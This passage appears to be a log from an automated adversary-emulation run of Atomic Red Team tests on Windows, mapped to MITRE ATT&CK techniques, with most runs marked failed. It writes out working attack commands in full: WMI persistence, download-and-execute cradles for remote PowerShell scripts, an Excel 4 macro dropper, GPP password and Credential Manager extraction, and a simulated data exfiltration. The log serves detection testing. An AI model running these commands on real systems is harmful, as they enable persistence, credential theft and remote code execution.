            '-Namespace root/subscription -ClassName __EventFilter -Property '
            '$FilterArgs; $ConsumerArgs = '
            "@{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';                 "
            'CommandLineTemplate="$($Env:SystemRoot)\\System32\\notepad.exe";}; '
            '$Consumer=New-CimInstance -Namespace root/subscription -ClassName '
            'CommandLineEventConsumer -Property $ConsumerArgs; '
            '$FilterToConsumerArgs = @{; Filter = [Ref] $Filter; Consumer = '
            '[Ref] $Consumer; }; $FilterToConsumerBinding = New-CimInstance '
            '-Namespace root/subscription -ClassName __FilterToConsumerBinding '
            '-Property $FilterToConsumerArgs',
 'delegated': '2023-12-01T19:08:23Z',
 'description': 'Run from an administrator powershell window. After running, '
                'reboot the victim machine.\n'
                'After it has been online for 4 minutes you should see '
                'notepad.exe running as SYSTEM.\n'
                '\n'
                'Code references\n'
                '\n'
                'https://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af\n'
                '\n'
                'https://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545\n',
 'executor': 'psh',
 'link_id': '8602eb00-0a89-4407-a521-977dcb825873',
 'name': 'Persistence via WMI Event Subscription - CommandLineEventConsumer',
 'pid': 6464,
 'plaintext_command': '$FilterArgs = '
                      "@{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';                 "
                      "EventNameSpace='root\\CimV2';                 "
                      'QueryLanguage="WQL";                 Query="SELECT * '
                      'FROM __InstanceModificationEvent WITHIN 60 WHERE '
                      'TargetInstance ISA '
                      "'Win32_PerfFormattedData_PerfOS_System' AND "
                      'TargetInstance.SystemUpTime >= 240 AND '
                      'TargetInstance.SystemUpTime < 325"}; '
                      '$Filter=New-CimInstance -Namespace root/subscription '
                      '-ClassName __EventFilter -Property $FilterArgs; '
                      '$ConsumerArgs = '
                      "@{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';                 "
                      'CommandLineTemplate="$($Env:SystemRoot)\\System32\\notepad.exe";}; '
                      '$Consumer=New-CimInstance -Namespace root/subscription '
                      '-ClassName CommandLineEventConsumer -Property '
                      '$ConsumerArgs; $FilterToConsumerArgs = @{; Filter = '
                      '[Ref] $Filter; Consumer = [Ref] $Consumer; }; '
                      '$FilterToConsumerBinding = New-CimInstance -Namespace '
                      'root/subscription -ClassName __FilterToConsumerBinding '
                      '-Property $FilterToConsumerArgs',
 'platform': 'windows',
 'run': '2023-12-01T19:08:56Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1027__defense-evasion__obfuscated_files_or_information__7b6d0accaab6330d701dea8f4d7d96d4__trial_1

atomic_ordering: ['7b6d0accaab6330d701dea8f4d7d96d4']
------------------------------
{'ability_id': '7b6d0accaab6330d701dea8f4d7d96d4',
 'agent_reported_time': '2023-11-11T13:09:47Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1027',
            'technique_name': 'Obfuscated Files or Information'},
 'command': 'Invoke-WebRequest -Uri 127.0.0.1 -Method POST -Body '
            '"9070cd_T1027-cc-macro.xlsm"',
 'delegated': '2023-11-27T12:16:38Z',
 'description': 'Upon successful execution, an excel containing VBA Macro '
                'containing sensitive data will be sent outside the network '
                'using HTTP.\n'
                'Sensitive data includes about around 20 odd simulated credit '
                'card numbers that passes the LUHN check.\n',
 'executor': 'psh',
 'link_id': 'de313276-5538-49cb-8494-5fbfc18f172c',
 'name': 'DLP Evasion via Sensitive Data in VBA Macro over HTTP',
 'pid': 10148,
 'plaintext_command': 'Invoke-WebRequest -Uri 127.0.0.1 -Method POST -Body '
                      '"9070cd_T1027-cc-macro.xlsm"',
 'platform': 'windows',
 'run': '2023-11-27T12:16:47Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1552_006__credential-access__unsecured_credentials-_group_policy_preferences__e93d024cd93ceaaf880d6f799ef1c9c8__trial_1

atomic_ordering: ['e93d024cd93ceaaf880d6f799ef1c9c8']
------------------------------
{'ability_id': 'e93d024cd93ceaaf880d6f799ef1c9c8',
 'agent_reported_time': '2023-11-11T13:10:50Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1552.006',
            'technique_name': 'Unsecured Credentials: Group Policy '
                              'Preferences'},
 'command': '. '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-GPPPassword.ps1"; '
            'Get-GPPPassword -Verbose',
 'delegated': '2023-12-02T18:41:21Z',
 'description': 'Look for the encrypted cpassword value within Group Policy '
                'Preference files on the Domain Controller.\n'
                'This test is intended to be run from a domain joined '
                'workstation, not on the Domain Controller itself.\n'
                'The Get-GPPPasswords.ps1 executed during this test can be '
                'obtained using the get-prereq_commands.\n'
                '\n'
                'Successful test execution will either display the credentials '
                'found in the GPP files or indicate "No preference files '
                'found".\n',
 'executor': 'psh',
 'link_id': '1740103f-c5ff-4660-8939-e3001ecb1f14',
 'name': 'GPP Passwords (Get-GPPPassword)',
 'pid': 11100,
 'plaintext_command': '. '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-GPPPassword.ps1"; '
                      'Get-GPPPassword -Verbose',
 'platform': 'windows',
 'run': '2023-12-02T18:42:25Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1564__defense-evasion__hide_artifacts__59638371d64a1fb450ee7f4d9c19b3d6__trial_1

atomic_ordering: ['59638371d64a1fb450ee7f4d9c19b3d6']
==============================
==============================
adversary_id: atomic__t1615__discovery__group_policy_discovery__a3c8fba61f02a7b96306b87121b2ac4b__trial_1

atomic_ordering: ['a3c8fba61f02a7b96306b87121b2ac4b']
------------------------------
{'ability_id': 'a3c8fba61f02a7b96306b87121b2ac4b',
 'agent_reported_time': '2023-11-11T13:11:28Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1615',
            'technique_name': 'Group Policy Discovery'},
 'command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
            'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
            'GPOAudit -noninteractive -consoleoutput',
 'delegated': '2023-12-04T04:41:41Z',
 'description': 'Check domain Group policies for common misconfigurations '
                'using Grouper2 via GPOAudit function of WinPwn',
 'executor': 'psh',
 'link_id': '29df993e-0529-4e8e-a40b-f9cd207a995e',
 'name': 'WinPwn - GPOAudit',
 'pid': 4112,
 'plaintext_command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
                      'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
                      'GPOAudit -noninteractive -consoleoutput',
 'platform': 'windows',
 'run': '2023-12-04T04:42:35Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1218_005__defense-evasion__signed_binary_proxy_execution-_mshta__35200ef3d7ca094ae2208a1df03ede18__trial_1

atomic_ordering: ['35200ef3d7ca094ae2208a1df03ede18']
------------------------------
{'ability_id': '35200ef3d7ca094ae2208a1df03ede18',
 'agent_reported_time': '2023-11-11T13:10:25Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1218.005',
            'technique_name': 'Signed Binary Proxy Execution: Mshta'},
 'command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
            '-ListAvailable; if (-not $RequiredModule) {Install-Module -Name '
            'AtomicTestHarnesses -Scope CurrentUser -Force};  ;  '
            'Invoke-ATHHTMLApplication -ScriptEngine JScript '
            '-InlineProtocolHandler About -MSHTAFilePath '
            '$env:windir\\system32\\mshta.exe',
 'delegated': '2023-11-30T23:06:09Z',
 'description': 'Executes an HTA Application with JScript Engine and Inline '
                'Protocol Handler.',
 'executor': 'psh',
 'link_id': '6213d4a1-f60a-48c2-a467-7d5be00c396f',
 'name': 'Invoke HTML Application - JScript Engine with Inline Protocol '
         'Handler',
 'pid': 8224,
 'plaintext_command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
                      '-ListAvailable; if (-not $RequiredModule) '
                      '{Install-Module -Name AtomicTestHarnesses -Scope '
                      'CurrentUser -Force};  ;  Invoke-ATHHTMLApplication '
                      '-ScriptEngine JScript -InlineProtocolHandler About '
                      '-MSHTAFilePath $env:windir\\system32\\mshta.exe',
 'platform': 'windows',
 'run': '2023-11-30T23:07:26Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1087_002__discovery__account_discovery-_domain_account__10a0f4f8efdae71f3e88b3e20560798a__trial_1

atomic_ordering: ['10a0f4f8efdae71f3e88b3e20560798a']
------------------------------
{'ability_id': '10a0f4f8efdae71f3e88b3e20560798a',
 'agent_reported_time': '2023-11-11T13:10:04Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1087.002',
            'technique_name': 'Account Discovery: Domain Account'},
 'command': 'Try {;     Import-Module ActiveDirectory -ErrorAction Stop | '
            'Out-Null;      ; }; Catch {;     if((Get-CimInstance -ClassName '
            'Win32_OperatingSystem).ProductType -eq 1) {;   '
            'Add-WindowsCapability -Name (Get-WindowsCapability -Name '
            'RSAT.ActiveDirectory.DS* -Online).Name -Online; } else {;   '
            'Install-WindowsFeature RSAT-AD-PowerShell; }; };  ;  Get-ADObject '
            "-LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=524288)' "
            '-Server $env:UserDnsDomain',
 'delegated': '2023-11-29T05:34:08Z',
 'description': 'Attackers may attempt to query for computer objects with the '
                'UserAccountControl property\n'
                "'TRUSTED_FOR_DELEGATION' (0x80000;524288) set\n"
                'More Information - '
                'https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-the-stars-align-unconstrained-delegation-leads-to-rce\n'
                'Prerequisite: AD RSAT PowerShell module is needed and it must '
                'run under a domain user\n',
 'executor': 'psh',
 'link_id': 'e411e855-2853-42ff-98d3-815fea47cd07',
 'name': 'Enumerate Active Directory for Unconstrained Delegation',
 'pid': 212,
 'plaintext_command': 'Try {;     Import-Module ActiveDirectory -ErrorAction '
                      'Stop | Out-Null;      ; }; Catch {;     '
                      'if((Get-CimInstance -ClassName '
                      'Win32_OperatingSystem).ProductType -eq 1) {;   '
                      'Add-WindowsCapability -Name (Get-WindowsCapability '
                      '-Name RSAT.ActiveDirectory.DS* -Online).Name -Online; } '
                      'else {;   Install-WindowsFeature RSAT-AD-PowerShell; }; '
                      '};  ;  Get-ADObject -LDAPFilter '
                      "'(UserAccountControl:1.2.840.113556.1.4.803:=524288)' "
                      '-Server $env:UserDnsDomain',
 'platform': 'windows',
 'run': '2023-11-29T05:34:18Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1486__impact__data_encrypted_for_impact__f22a27383f804337af8e690aae594d97__trial_1

atomic_ordering: ['f22a27383f804337af8e690aae594d97']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1204_002__execution__user_execution-_malicious_file__623806a6fd4d832b6692eb275535f636__trial_1

atomic_ordering: ['623806a6fd4d832b6692eb275535f636']
------------------------------
{'ability_id': '623806a6fd4d832b6692eb275535f636',
 'agent_reported_time': '2023-11-11T13:09:07Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1204.002',
            'technique_name': 'User Execution: Malicious File'},
 'command': '$fname = "$env:TEMP\\atomic_redteam_x4m_exec.vbs"; $fname1 = '
            '"$env:TEMP\\procexp.exe"; if (Test-Path $fname) {;   Remove-Item '
            '$fname;   Remove-Item $fname1; }; $xlApp = New-Object -COMObject '
            '"Excel.Application"; $xlApp.Visible = $True; $xlApp.DisplayAlerts '
            '= $False; $xlBook = $xlApp.Workbooks.Add(); $sheet = '
            '$xlBook.Excel4MacroSheets.Add(); if ("$env:Username" -ne "") {;   '
            '$sheet.Cells.Item(1,1) = "$env:Username"; } else {;   '
            '$sheet.Cells.Item(1,1) = "=GET.WORKSPACE(26)"; }; '
            '$sheet.Cells.Item(2,1) = "procexp.exe"; $sheet.Cells.Item(3,1) = '
            '"atomic_redteam_x4m_exec.vbs"; $sheet.Cells.Item(4,1) = '
            '"=IF(ISNUMBER(SEARCH(`"64`",GET.WORKSPACE(1))), GOTO(A5),)"; '
            '$sheet.Cells.Item(5,1) = '
            '"=FOPEN(`"C:\\Users\\`"&A1&`"\\AppData\\Local\\Temp\\`"&A3&`"`", '
            '3)"; $sheet.Cells.Item(6,1) = "=FWRITELN(A5, `"url = '
            '`"`"https://live.sysinternals.com/procexp.exe`"`"`")"; '
            '$sheet.Cells.Item(7,1) = "=FWRITELN(A5, `"`")"; '
            '$sheet.Cells.Item(8,1) = "=FWRITELN(A5, `"Set winHttp = '
            'CreateObject(`"`"WinHTTP.WinHTTPrequest.5.1`"`")`")"; '
            '$sheet.Cells.Item(9,1) = "=FWRITELN(A5, `"winHttp.Open '
            '`"`"GET`"`", url, False`")"; $sheet.Cells.Item(10,1) = '
            '"=FWRITELN(A5, `"winHttp.Send`")"; $sheet.Cells.Item(11,1) = '
            '"=FWRITELN(A5, `"If winHttp.Status = 200 Then`")"; '
            '$sheet.Cells.Item(12,1) = "=FWRITELN(A5, `"Set oStream = '
            'CreateObject(`"`"ADODB.Stream`"`")`")"; $sheet.Cells.Item(13,1) = '
            '"=FWRITELN(A5, `"oStream.Open`")"; $sheet.Cells.Item(14,1) = '
            '"=FWRITELN(A5, `"oStream.Type = 1`")"; $sheet.Cells.Item(15,1) = '
            '"=FWRITELN(A5, `"oStream.Write winHttp.responseBody`")"; '
            '$sheet.Cells.Item(16,1) = "=FWRITELN(A5, `"oStream.SaveToFile '
            '`"`"C:\\Users\\`"&A1&`"\\AppData\\Local\\Temp\\`"&A2&`"`"`", '
            '2`")"; $sheet.Cells.Item(17,1) = "=FWRITELN(A5, '
            '`"oStream.Close`")"; $sheet.Cells.Item(18,1) = "=FWRITELN(A5, '
            '`"End If`")"; $sheet.Cells.Item(19,1) = "=FCLOSE(A5)"; '
            '$sheet.Cells.Item(20,1) = "=EXEC(`"explorer.exe '
            'C:\\Users\\`"&A1&`"\\AppData\\Local\\Temp\\`"&A3&`"`")"; '
            '$sheet.Cells.Item(21,1) = "=WAIT(NOW()+`"00:00:05`")"; '
            '$sheet.Cells.Item(22,1) = "=EXEC(`"explorer.exe '
            'C:\\Users\\`"&A1&`"\\AppData\\Local\\Temp\\`"&A2&`"`")"; '
            '$sheet.Cells.Item(23,1) = "=HALT()"; $sheet.Cells.Item(1,1).Name '
            '= "runme"; $xlApp.Run("runme"); $xlApp.Quit(); '
            '[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) '
            '| Out-Null; '
            '[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) '
            '| Out-Null; [System.GC]::Collect(); '
            '[System.GC]::WaitForPendingFinalizers(); Remove-Variable xlBook; '
            'Remove-Variable xlApp',
 'delegated': '2023-11-30T14:39:43Z',
 'description': 'This module creates an Excel 4 Macro (XLM) enabled '
                'spreadsheet and executes it. The XLM will first write a '
                '"malicious"\n'
                'VBS file to %TEMP%, then execute this file. The VBS will '
                'download Process Explorer to the same directory (%TEMP%) and '
                'exec.\n'
                '\n'
                'A note regarding this module. By default, this module will '
                'pull the current username from the system and places it into '
                'the macro. If\n'
                'you\'d like to utilize the "=GET.WORKSPACE(26)" method, that '
                'many maldoc authors use, you will need to ensure that the '
                'User Name associated\n'
                'with Excel matches that of the local system. This username '
                'can be found under Files -> Options -> Username\n',
 'executor': 'psh',
 'link_id': '02b734d5-1847-4094-919e-985b5e43f0e2',
 'name': 'Excel 4 Macro',
 'pid': 3324,
 'plaintext_command': '$fname = "$env:TEMP\\atomic_redteam_x4m_exec.vbs"; '
                      '$fname1 = "$env:TEMP\\procexp.exe"; if (Test-Path '
                      '$fname) {;   Remove-Item $fname;   Remove-Item $fname1; '
                      '}; $xlApp = New-Object -COMObject "Excel.Application"; '
                      '$xlApp.Visible = $True; $xlApp.DisplayAlerts = $False; '
                      '$xlBook = $xlApp.Workbooks.Add(); $sheet = '
                      '$xlBook.Excel4MacroSheets.Add(); if ("$env:Username" '
                      '-ne "") {;   $sheet.Cells.Item(1,1) = "$env:Username"; '
                      '} else {;   $sheet.Cells.Item(1,1) = '
                      '"=GET.WORKSPACE(26)"; }; $sheet.Cells.Item(2,1) = '
                      '"procexp.exe"; $sheet.Cells.Item(3,1) = '
                      '"atomic_redteam_x4m_exec.vbs"; $sheet.Cells.Item(4,1) = '
                      '"=IF(ISNUMBER(SEARCH(`"64`",GET.WORKSPACE(1))), '
                      'GOTO(A5),)"; $sheet.Cells.Item(5,1) = '
                      '"=FOPEN(`"C:\\Users\\`"&A1&`"\\AppData\\Local\\Temp\\`"&A3&`"`", '
                      '3)"; $sheet.Cells.Item(6,1) = "=FWRITELN(A5, `"url = '
                      '`"`"https://live.sysinternals.com/procexp.exe`"`"`")"; '
                      '$sheet.Cells.Item(7,1) = "=FWRITELN(A5, `"`")"; '
                      '$sheet.Cells.Item(8,1) = "=FWRITELN(A5, `"Set winHttp = '
                      'CreateObject(`"`"WinHTTP.WinHTTPrequest.5.1`"`")`")"; '
                      '$sheet.Cells.Item(9,1) = "=FWRITELN(A5, `"winHttp.Open '
                      '`"`"GET`"`", url, False`")"; $sheet.Cells.Item(10,1) = '
                      '"=FWRITELN(A5, `"winHttp.Send`")"; '
                      '$sheet.Cells.Item(11,1) = "=FWRITELN(A5, `"If '
                      'winHttp.Status = 200 Then`")"; $sheet.Cells.Item(12,1) '
                      '= "=FWRITELN(A5, `"Set oStream = '
                      'CreateObject(`"`"ADODB.Stream`"`")`")"; '
                      '$sheet.Cells.Item(13,1) = "=FWRITELN(A5, '
                      '`"oStream.Open`")"; $sheet.Cells.Item(14,1) = '
                      '"=FWRITELN(A5, `"oStream.Type = 1`")"; '
                      '$sheet.Cells.Item(15,1) = "=FWRITELN(A5, '
                      '`"oStream.Write winHttp.responseBody`")"; '
                      '$sheet.Cells.Item(16,1) = "=FWRITELN(A5, '
                      '`"oStream.SaveToFile '
                      '`"`"C:\\Users\\`"&A1&`"\\AppData\\Local\\Temp\\`"&A2&`"`"`", '
                      '2`")"; $sheet.Cells.Item(17,1) = "=FWRITELN(A5, '
                      '`"oStream.Close`")"; $sheet.Cells.Item(18,1) = '
                      '"=FWRITELN(A5, `"End If`")"; $sheet.Cells.Item(19,1) = '
                      '"=FCLOSE(A5)"; $sheet.Cells.Item(20,1) = '
                      '"=EXEC(`"explorer.exe '
                      'C:\\Users\\`"&A1&`"\\AppData\\Local\\Temp\\`"&A3&`"`")"; '
                      '$sheet.Cells.Item(21,1) = "=WAIT(NOW()+`"00:00:05`")"; '
                      '$sheet.Cells.Item(22,1) = "=EXEC(`"explorer.exe '
                      'C:\\Users\\`"&A1&`"\\AppData\\Local\\Temp\\`"&A2&`"`")"; '
                      '$sheet.Cells.Item(23,1) = "=HALT()"; '
                      '$sheet.Cells.Item(1,1).Name = "runme"; '
                      '$xlApp.Run("runme"); $xlApp.Quit(); '
                      '[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) '
                      '| Out-Null; '
                      '[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) '
                      '| Out-Null; [System.GC]::Collect(); '
                      '[System.GC]::WaitForPendingFinalizers(); '
                      'Remove-Variable xlBook; Remove-Variable xlApp',
 'platform': 'windows',
 'run': '2023-11-30T14:40:37Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1204_002__execution__user_execution-_malicious_file__f71199dcf1e307fc37c5a0cb9e4031b9__trial_1

atomic_ordering: ['f71199dcf1e307fc37c5a0cb9e4031b9']
------------------------------
{'ability_id': 'f71199dcf1e307fc37c5a0cb9e4031b9',
 'agent_reported_time': '2023-11-11T13:10:15Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1204.002',
            'technique_name': 'User Execution: Malicious File'},
 'command': 'Invoke-WebRequest -OutFile $env:Temp\\test10.lnk '
            '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk"; '
            '$file1 = "$env:Temp\\test10.lnk"; Start-Process $file1; '
            'Start-Sleep -s 10; taskkill /IM a.exe /F',
 'delegated': '2023-11-30T16:56:44Z',
 'description': 'This lnk files invokes powershell to download putty from the '
                'internet and opens the file. '
                'https://twitter.com/ankit_anubhav/status/1518932941090410496',
 'executor': 'psh',
 'link_id': '9195ba54-684b-427b-9ebf-b895c8f3d7d8',
 'name': 'LNK Payload Download',
 'pid': 8788,
 'plaintext_command': 'Invoke-WebRequest -OutFile $env:Temp\\test10.lnk '
                      '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk"; '
                      '$file1 = "$env:Temp\\test10.lnk"; Start-Process $file1; '
                      'Start-Sleep -s 10; taskkill /IM a.exe /F',
 'platform': 'windows',
 'run': '2023-11-30T16:57:14Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1059_003__execution__command_and_scripting_interpreter-_windows_command_shell__f5cef6032e9bace6a1938456ac5a5cfb__trial_1

atomic_ordering: ['f5cef6032e9bace6a1938456ac5a5cfb']
------------------------------
{'ability_id': 'f5cef6032e9bace6a1938456ac5a5cfb',
 'agent_reported_time': '2023-11-11T13:09:18Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1059.003',
            'technique_name': 'Command and Scripting Interpreter: Windows '
                              'Command Shell'},
 'command': 'Start-Process '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1059.003_script.bat"',
 'delegated': '2023-11-28T10:12:10Z',
 'description': 'Creates and executes a simple batch script. Upon execution, '
                'CMD will briefly launch to run the batch script then close '
                'again.\n',
 'executor': 'psh',
 'link_id': 'ba06382b-dd33-441c-b3e4-d7e83d7a80c7',
 'name': 'Create and Execute Batch Script',
 'pid': 7928,
 'plaintext_command': 'Start-Process '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1059.003_script.bat"',
 'platform': 'windows',
 'run': '2023-11-28T10:12:54Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1555__credential-access__credentials_from_password_stores__935e8026584b85192519c57d7080b048__trial_1

atomic_ordering: ['935e8026584b85192519c57d7080b048']
------------------------------
{'ability_id': '935e8026584b85192519c57d7080b048',
 'agent_reported_time': '2023-11-11T13:09:55Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1555',
            'technique_name': 'Credentials from Password Stores'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
            '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
            '-UseBasicParsing); Invoke-Maldoc -macroFile '
            '"PathToAtomicsFolder\\T1555\\src\\T1555-macrocode.txt" '
            '-officeProduct "Word" -sub "Extract"',
 'delegated': '2023-12-03T02:08:09Z',
 'description': 'This module will extract the credentials found within the '
                'Windows credential manager and dump\n'
                'them to $env:TEMP\\windows-credentials.txt\n',
 'executor': 'psh',
 'link_id': '006c84d5-8391-44a9-8f7d-0b03982378d6',
 'name': 'Extract Windows Credential Manager via VBA',
 'pid': 5244,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
                      '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
                      '-UseBasicParsing); Invoke-Maldoc -macroFile '
                      '"PathToAtomicsFolder\\T1555\\src\\T1555-macrocode.txt" '
                      '-officeProduct "Word" -sub "Extract"',
 'platform': 'windows',
 'run': '2023-12-03T02:08:19Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1572__command-and-control__protocol_tunneling__69b202bf0bb7b4ff43d4abb8867c1784__trial_1

atomic_ordering: ['69b202bf0bb7b4ff43d4abb8867c1784']
------------------------------
{'ability_id': '69b202bf0bb7b4ff43d4abb8867c1784',
 'agent_reported_time': '2023-11-11T13:09:58Z',
 'attack': {'tactic': 'command-and-control',
            'technique_id': 'T1572',
            'technique_name': 'Protocol Tunneling'},
 'command': 'for($i=0; $i -le',
 'delegated': '2023-12-04T00:06:39Z',
 'description': 'This test simulates an infected host sending a large volume '
                'of DoH queries to a command and control server.\n'
                'The intent of this test is to trigger threshold based '
                'detection on the number of DoH queries either from a single '
                'source system or to a single targe domain.\n'
                'A custom domain and sub-domain will need to be passed as '
                'input parameters for this test to work. Upon execution, DNS '
                'information about the domain will be displayed for each '
                'callout in a JSON format.\n',
 'executor': 'psh',
 'link_id': 'b67336ef-e32b-4ffc-98bf-50fd22bdc69a',
 'name': 'DNS over HTTPS Large Query Volume',
 'pid': 4532,
 'plaintext_command': 'for($i=0; $i -le',
 'platform': 'windows',
 'run': '2023-12-04T00:06:48Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1098__persistence__account_manipulation__1c1381522818218092a12b973593f3a9__trial_1

atomic_ordering: ['1c1381522818218092a12b973593f3a9']
------------------------------
{'ability_id': '1c1381522818218092a12b973593f3a9',
 'agent_reported_time': '2023-11-11T13:10:05Z',
 'attack': {'tactic': 'persistence',
            'technique_id': 'T1098',
            'technique_name': 'Account Manipulation'},
 'command': 'if (Test-Path '
            '$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else '
            '{New-Item -Type Directory (split-path '
            '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt") '
            '-ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  '
            '$env:USERNAME -message "Enter password for $env:USERNAME to use '
            'during password change attempt"; $cred.Password | '
            'ConvertFrom-SecureString | Out-File '
            '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"};  ;  '
            '$credFile = '
            '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"; if '
            '(Test-Path $credFile) {;     $cred = New-Object -TypeName '
            'System.Management.Automation.PSCredential -ArgumentList '
            '$env:USERNAME, (Get-Content $credFile | '
            'ConvertTo-SecureString);     '
            'if($cred.GetNetworkCredential().Password -eq '
            '"lower-long-special-333"){;       Write-Host -ForegroundColor '
            'Yellow "The new password is the same as the password stored in '
            'the credential file. Please specify a different new password."; '
            'exit -1;     };     try {;         $newPassword = '
            'ConvertTo-SecureString lower-long-special-333 -AsPlainText '
            '-Force;         Set-ADAccountPassword -Identity $env:USERNAME '
            '-OldPassword $cred.password -NewPassword $newPassword;     };     '
            'catch { ;         $_.Exception;         $errCode = '
            '$_.Exception.ErrorCode;         Write-Host "Error code: '
            '$errCode";         if ($errCode -eq 86) {;             Write-Host '
            '-ForegroundColor Yellow "The stored password for the current user '
            'is incorrect. Please run the prereq commands to set the correct '
            'credentials";             Remove-Item $credFile;         '
            '};         exit $errCode;     };     Write-Host -ForegroundColor '
            'Cyan "Successfully changed the password to '
            'lower-long-special-333";     $newCred = New-Object '
            'System.Management.Automation.PSCredential ($env:USERNAME, '
            '$(ConvertTo-SecureString "lower-long-special-333" -AsPlainText '
            '-Force));     $newCred.Password | ConvertFrom-SecureString | '
            'Out-File $credFile; }; else {;     Write-Host -ForegroundColor '
            'Yellow "You must store the password of the current user by '
            'running the prerequisite commands first"; }',
 'delegated': '2023-11-29T13:17:36Z',
 'description': 'Attempt to change the password of the current domain user in '
                'order to check password policy. Ideally, you would only run '
                'this atomic test to verify that your password policy is '
                'blocking the use of the new password.\n'
                'If the password is succesfully changed to the new password, '
                'the credential file will be updated to reflect the new '
                'password. You can then run the atomic manually and specify a '
                'new password of your choosing, however the\n'
                'password policy will likely prevent you from setting the '
                'password back to what it was. \n',
 'executor': 'psh',
 'link_id': '1bc2b3f6-53b9-487c-a843-a84c7dc32a89',
 'name': 'Domain Password Policy Check: No Uppercase Character in Password',
 'pid': 8432,
 'plaintext_command': 'if (Test-Path '
                      '$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { '
                      '; } else {New-Item -Type Directory (split-path '
                      '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt") '
                      '-ErrorAction Ignore | Out-Null; $cred = Get-Credential '
                      '-UserName  $env:USERNAME -message "Enter password for '
                      '$env:USERNAME to use during password change attempt"; '
                      '$cred.Password | ConvertFrom-SecureString | Out-File '
                      '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"};  '
                      ';  $credFile = '
                      '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"; '
                      'if (Test-Path $credFile) {;     $cred = New-Object '
                      '-TypeName System.Management.Automation.PSCredential '
                      '-ArgumentList $env:USERNAME, (Get-Content $credFile | '
                      'ConvertTo-SecureString);     '
                      'if($cred.GetNetworkCredential().Password -eq '
                      '"lower-long-special-333"){;       Write-Host '
                      '-ForegroundColor Yellow "The new password is the same '
                      'as the password stored in the credential file. Please '
                      'specify a different new password."; exit -1;     };     '
                      'try {;         $newPassword = ConvertTo-SecureString '
                      'lower-long-special-333 -AsPlainText -Force;         '
                      'Set-ADAccountPassword -Identity $env:USERNAME '
                      '-OldPassword $cred.password -NewPassword '
                      '$newPassword;     };     catch { ;         '
                      '$_.Exception;         $errCode = '
                      '$_.Exception.ErrorCode;         Write-Host "Error code: '
                      '$errCode";         if ($errCode -eq 86) {;             '
